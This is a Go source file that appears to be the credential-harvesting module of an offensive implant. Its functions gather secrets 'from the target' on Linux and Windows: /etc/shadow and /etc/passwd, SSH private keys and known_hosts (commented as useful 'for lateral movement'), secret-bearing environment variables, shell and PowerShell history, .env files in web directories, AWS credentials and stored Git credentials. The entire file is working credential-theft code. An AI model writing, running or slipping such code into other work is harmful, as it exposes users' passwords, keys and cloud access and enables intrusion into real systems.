package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

// credSection writes a section header into buf.
func credSection(buf *bytes.Buffer, title string) {
	fmt.Fprintf(buf, "\n─── %s ───\n", title)
}

// credSecretKeywords is the list of env-var substrings that suggest a secret value.
var credSecretKeywords = []string{
	"password", "passwd", "secret", "token",
	"api_key", "apikey", "access_key", "auth", "credential",
}

// harvestCreds collects credential material from the target and returns it as
// a formatted text blob. Works without a PTY — pure Go file reads + exec.
func harvestCreds() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return harvestCredsWindows()
	}
	return harvestCredsLinux()
}

func harvestCredsLinux() ([]byte, error) {
	var buf bytes.Buffer

	// /etc/shadow
	credSection(&buf, "SHADOW FILE")
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		buf.Write(data)
	} else {
		fmt.Fprintf(&buf, "[not accessible: %v]\n", err)
	}

	// /etc/passwd (for password hashes in old systems and user enumeration)
	credSection(&buf, "PASSWD FILE")
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		buf.Write(data)
	} else {
		fmt.Fprintf(&buf, "[not accessible: %v]\n", err)
	}

	// SSH private keys for current user and /root
	credSection(&buf, "SSH PRIVATE KEYS")
	sshDirs := []string{
		filepath.Join(homeDir(), ".ssh"),
		"/root/.ssh",
	}
	keyNames := []string{"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_ecdsa_sk", "id_ed25519_sk"}
	foundKey := false
	for _, dir := range sshDirs {
		for _, name := range keyNames {
			path := filepath.Join(dir, name)
			if data, err := os.ReadFile(path); err == nil {
				fmt.Fprintf(&buf, "=== %s ===\n", path)
				buf.Write(data)
				buf.WriteByte('\n')
				foundKey = true
			}
		}
		// Also grab known_hosts for lateral movement info.
		if data, err := os.ReadFile(filepath.Join(dir, "known_hosts")); err == nil {
			fmt.Fprintf(&buf, "=== %s/known_hosts ===\n", dir)
			buf.Write(data)
		}
	}
	if !foundKey {
		fmt.Fprintf(&buf, "[no readable private keys found]\n")
	}

	// Environment secrets (current process env).
	credSection(&buf, "ENV SECRETS")
	envFound := 0
	for _, kv := range os.Environ() {
		lower := strings.ToLower(kv)
		for _, kw := range credSecretKeywords {
			if strings.Contains(lower, kw) {
				fmt.Fprintf(&buf, "%s\n", kv)
				envFound++
				break
			}
		}
	}
	if envFound == 0 {
		fmt.Fprintf(&buf, "[none found]\n")
	}

	// Bash/zsh history.
	credSection(&buf, "SHELL HISTORY")
	histFiles := []string{
		filepath.Join(homeDir(), ".bash_history"),
		filepath.Join(homeDir(), ".zsh_history"),
		"/root/.bash_history",
		"/root/.zsh_history",
	}
	for _, hf := range histFiles {
		lines := readHistoryTail(hf, 30)
		if len(lines) > 0 {
			fmt.Fprintf(&buf, "=== %s (last %d lines) ===\n", hf, len(lines))
			fmt.Fprintf(&buf, "%s\n", strings.Join(lines, "\n"))
		}
	}

	// .env files (common locations).
	credSection(&buf, ".ENV FILES")
	envSearchDirs := []string{"/var/www", "/opt", "/home", "/srv", "/app"}
	envFound = 0
	for _, dir := range envSearchDirs {
		walkEnvFiles(dir, &buf, &envFound, 3)
		if envFound >= 10 {
			break
		}
	}
	if envFound == 0 {
		fmt.Fprintf(&buf, "[none found in common paths]\n")
	}

	// AWS credentials.
	credSection(&buf, "AWS CREDENTIALS")
	awsPaths := []string{
		filepath.Join(homeDir(), ".aws", "credentials"),
		"/root/.aws/credentials",
	}
	foundAWS := false
	for _, p := range awsPaths {
		if data, err := os.ReadFile(p); err == nil {
			fmt.Fprintf(&buf, "=== %s ===\n", p)
			buf.Write(data)
			foundAWS = true
		}
	}
	if !foundAWS {
		fmt.Fprintf(&buf, "[not found]\n")
	}

	// Git credential helpers / stored credentials.
	credSection(&buf, "GIT CREDENTIALS")
	gitCredPaths := []string{
		filepath.Join(homeDir(), ".git-credentials"),
		"/root/.git-credentials",
	}
	foundGit := false
	for _, p := range gitCredPaths {
		if data, err := os.ReadFile(p); err == nil {
			fmt.Fprintf(&buf, "=== %s ===\n", p)
			buf.Write(data)
			foundGit = true
		}
	}
	if !foundGit {
		fmt.Fprintf(&buf, "[not found]\n")
	}

	return buf.Bytes(), nil
}

func harvestCredsWindows() ([]byte, error) {
	var buf bytes.Buffer

	// PowerShell history.
	credSection(&buf, "POWERSHELL HISTORY")
	psHistPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "PowerShell",
		"PSReadLine", "ConsoleHost_history.txt")
	lines := readHistoryTail(psHistPath, 30)
	if len(lines) > 0 {
		fmt.Fprintf(&buf, "%s\n", strings.Join(lines, "\n"))
	} else {
		fmt.Fprintf(&buf, "[not accessible or empty]\n")
	}

	// Env secrets.
	credSection(&buf, "ENV SECRETS")
	envFound := 0
	for _, kv := range os.Environ() {
		lower := strings.ToLower(kv)
		for _, kw := range credSecretKeywords {
			if strings.Contains(lower, kw) {
				fmt.Fprintf(&buf, "%s\n", kv)
				envFound++
				break
			}
		}
	}
	if envFound == 0 {
		fmt.Fprintf(&buf, "[none found]\n")
	}

	// SSH keys (OpenSSH for Windows).
	credSection(&buf, "SSH PRIVATE KEYS")
	sshDir := filepath.Join(os.Getenv("USERPROFILE"), ".ssh")
	keyNames := []string{"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_ecdsa_sk", "id_ed25519_sk"}
	foundKey := false
	for _, name := range keyNames {
		path := filepath.Join(sshDir, name)
		if data, err := os.ReadFile(path); err == nil {
			fmt.Fprintf(&buf, "=== %s ===\n", path)
			buf.Write(data)
			foundKey = true
		}
	}
	if !foundKey {
		fmt.Fprintf(&buf, "[no readable private keys found]\n")
	}

	// .env files.
	credSection(&buf, ".ENV FILES")
	envSearchDirs := []string{
		os.Getenv("USERPROFILE"),
		`C:\inetpub\wwwroot`,
		`C:\xampp\htdocs`,
		`C:\wamp\www`,
	}
	envCount := 0
	for _, dir := range envSearchDirs {
		if dir == "" {
			continue
		}
		walkEnvFiles(dir, &buf, &envCount, 2)
		if envCount >= 5 {
			break
		}
	}
	if envCount == 0 {
		fmt.Fprintf(&buf, "[none found]\n")
	}

	return buf.Bytes(), nil
}

// walkEnvFiles searches dir up to maxDepth levels for .env files and appends
// their contents to buf. Increments count for each file found.
func walkEnvFiles(dir string, buf *bytes.Buffer, count *int, maxDepth int) {
	walkDir(dir, 0, maxDepth, func(path string) {
		if filepath.Base(path) == ".env" {
			if data, err := os.ReadFile(path); err == nil && *count < 10 {
				fmt.Fprintf(buf, "=== %s ===\n", path)
				buf.Write(data)
				buf.WriteByte('\n')
				(*count)++
			}
		}
	})
}

// walkDir walks a directory tree up to maxDepth, calling fn for each file.
func walkDir(dir string, depth, maxDepth int, fn func(string)) {
	if depth > maxDepth {
		return
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			walkDir(path, depth+1, maxDepth, fn)
		} else {
			fn(path)
		}
	}
}

// readHistoryTail reads at most the last maxLines lines from path, reading
// only the last 8KB of the file to avoid unbounded memory usage on large
// history files.
func readHistoryTail(path string, maxLines int) []string {
	fi, err := os.Stat(path)
	if err != nil || fi.Size() == 0 {
		return nil
	}
	const maxRead = 8192
	readSize := fi.Size()
	if readSize > maxRead {
		readSize = maxRead
	}
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	if fi.Size() > readSize {
		f.Seek(fi.Size()-readSize, io.SeekStart)
	}
	data := make([]byte, readSize)
	n, _ := io.ReadFull(f, data)
	data = data[:n]

	// If we seeked into the middle of the file, discard the first partial line.
	if fi.Size() > readSize {
		if idx := bytes.IndexByte(data, '\n'); idx >= 0 {
			data = data[idx+1:]
		}
	}

	raw := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
	// Filter out empty lines.
	var lines []string
	for _, l := range raw {
		if l != "" {
			lines = append(lines, l)
		}
	}
	if len(lines) > maxLines {
		lines = lines[len(lines)-maxLines:]
	}
	return lines
}

// homeDir returns the current user's home directory, falling back to /root.
func homeDir() string {
	if h, err := os.UserHomeDir(); err == nil {
		return h
	}
	return "/root"
}
